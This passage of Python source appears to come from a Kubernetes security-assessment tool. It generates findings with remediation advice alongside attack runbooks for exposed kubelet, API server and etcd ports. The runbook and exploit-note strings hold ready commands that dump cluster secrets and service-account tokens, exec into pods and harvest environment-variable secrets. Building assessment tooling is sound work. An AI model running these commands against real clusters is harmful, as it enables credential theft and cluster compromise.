                    "Require client-certificate auth and peer TLS on etcd "
                    "(--client-cert-auth, --peer-client-cert-auth); firewall 2379/2380.",
                    ["CWE-306", "CWE-200", "CWE-284"], kind="etcd_open",
                    exploit_note=(
                        "ETCDCTL_API=3 etcdctl --endpoints http://<ip>:2379 get "
                        "/registry/secrets/ --prefix -w json | jq -r '.kvs[] | .value "
                        "| @base64d' — decrypt SA tokens and cluster TLS."),
                    depth_tier="t1"))
    return out


# --- runbook --------------------------------------------------------------------

def runbook(ip: str, port: int) -> list[dict]:
    r = role(port)
    if r == "kubelet":
        steps = [("enumerate", "kubeletctl",
                  f"kubeletctl -i --server {ip} pods", "List pods via the kubelet."),
                 ("escalate", "kubeletctl",
                  f"kubeletctl -i --server {ip} exec \"id\" -p <pod> -c <ctr> -n <ns>",
                  "Execute in a pod, read its service-account token, call the API as it.")]
    elif r == "kubelet-ro":
        steps = [("loot", "curl",
                  f"curl -s http://{ip}:{port}/pods | jq '.items[].spec.containers[].env'",
                  "Harvest env-var secrets from every pod spec.")]
    elif r == "apiserver":
        base = f"kubectl --server https://{ip}:{port} --insecure-skip-tls-verify"
        steps = [("enumerate", "kubectl", f"{base} get ns,pods -A",
                  "Enumerate the cluster as system:anonymous."),
                 ("loot", "kubectl", f"{base} get secrets -A -o yaml",
                  "Dump every secret if RBAC allows (cluster compromise).")]
    elif r == "etcd":
        steps = [("loot", "etcdctl",
                  f"ETCDCTL_API=3 etcdctl --endpoints {ip}:{port} get / --prefix --keys-only",
                  "List keys, then read /registry/secrets/* for tokens/keys.")]
    else:
        steps = []
    return [{"phase": ph, "tool": t, "command": c, "why": w} for ph, t, c, w in steps]


# --- proof screenshot -----------------------------------------------------------

def proof_html(command, output, banner: str = "") -> str:
    from ..services.db import mssql
    return mssql.proof_html(command, output, prompt="$ ", banner=banner)


# --- top-level analyze ----------------------------------------------------------

def findings_to_vulns(fs: list[dict]) -> dict:
    """Kubernetes findings -> {ip: [Vuln]} (source='kubernetes', script_id 'k8s:')."""
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "kubernetes", _KUBELET, prefix="k8s")


def analyze(hosts: list[Host], active: bool = True,
            budget: float | None = None, progress=None) -> dict:
    """Full Kubernetes analysis. Returns {targets, findings, runbooks, stats}.
    `budget` caps wall-clock seconds; `progress(i, n, target)` fires per probe."""
    from . import svcprobe
    targets = k8s_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        for t, pr in svcprobe.iter_probe(
                targets, lambda t: probe(t["ip"], t["port"]),
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["reachable"] = True
                for k in ("anon_pods", "anon_list", "anon_secrets", "v2_readable",
                          "v3_readable", "version", "etcd_version", "pod_count",
                          "anon_status", "anon_logs_dir", "anon_ssrr_rules",
                          "anon_ssrr_verbs", "pods_evidence"):
                    if k in pr:
                        t[k] = pr[k]
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"], "role": t["role"],
                 "credfree": runbook(t["ip"], t["port"]), "credentialed": []}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
